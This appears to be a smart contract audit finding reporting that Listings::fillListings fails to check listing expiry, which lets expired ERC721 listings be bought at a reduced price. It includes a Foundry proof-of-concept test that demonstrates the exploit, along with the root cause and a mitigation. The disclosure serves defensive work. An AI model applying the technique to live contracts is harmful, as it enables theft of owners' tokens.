# `Listing::fillListings` does not check if listing duration has ended and leads to the `ERC721` token been transfered at a price lesser than the listing price

### Summary

There is no checks in `Listing::fillListings` as to whether a listing has ended or not making the listing available after the duration, and since the listing contract holds the `ERC721` token, the token becomes transferable after the listing has ended. 

Also, the  `FILL_FEE` used in `Listing::fillListings` is based on `fees and refund` calculation from `Listing::_resolveListingTax` which enforces that when a listing has ended, no refund will be offered. This leads to the `FILL_FEE` (after listing has ended) not taking into consideration the `fees and refund`,  and the `ERC721` token been transferred at lesser price. 

### Root Cause

No Checks in `Listing::fillListings` on whether listing duration has expired.

### External pre-conditions

Listing has ended and the `listing.owner` is yet to retrieve his token.


### Impact

Loss of asset by owner

### PoC

```
    function test_POC() public {
        address _owner = makeAddr("owner");
        uint _tokenId;
        uint16 _floorMultiple = 400;

        erc721a.mint(_owner, _tokenId);

        vm.prank(_owner);
        erc721a.setApprovalForAll(address(listings), true);

        Listings.Listing memory listing = IListings.Listing({
            owner: payable(_owner),
            created: uint40(block.timestamp),
            duration: 7 days,
            floorMultiple: _floorMultiple
        });
       
        // Create our listing
        vm.startPrank(_owner);
        _createListing({
            _listing: IListings.CreateListing({
                collection: address(erc721a),
                tokenIds: _tokenIdToArray(_tokenId),
                listing: listing
            })
        });

        console.log("Balance of Owner after creating listing: ", locker.collectionToken(address(erc721a)).balanceOf(_owner));

        ICollectionToken token = locker.collectionToken(address(erc721a));

        console.log("Balance of Listing contract after listing is created: ",locker.collectionToken(address(erc721a)).balanceOf(address(listings)));

        vm.warp(1 days);

        (bool isAvailable, uint price) = listings.getListingPrice(address(erc721a), _tokenId);


        uint[][] memory tokenIdsOut = new uint[][](1);
        tokenIdsOut[0] = new uint[](1);
        tokenIdsOut[0][0] = _tokenId;

        address filler = makeAddr("filler");
        deal(address(locker.collectionToken(address(erc721a))), filler, price);
        
        vm.warp(99 days);
        vm.startPrank(filler);
        locker.collectionToken(address(erc721a)).approve(address(listings), type(uint).max);
        listings.fillListings(
            IListings.FillListingsParams({
                collection: address(erc721a),
                tokenIdsOut: tokenIdsOut
            })
        );
        vm.stopPrank();

        assertEq(erc721a.ownerOf(_tokenId), filler); //@audit Proof that the token was trasnferred
        assertEq(locker.collectionToken(address(erc721a)).balanceOf(address(filler)), price - 1 ether); //@audit 1 ether is the amount if there was nothing like fees or refund in the protocol system
    }
```

### Mitigation

A requirement check in `Listing::filling` to enforce that the token to be filled is within listing duration.
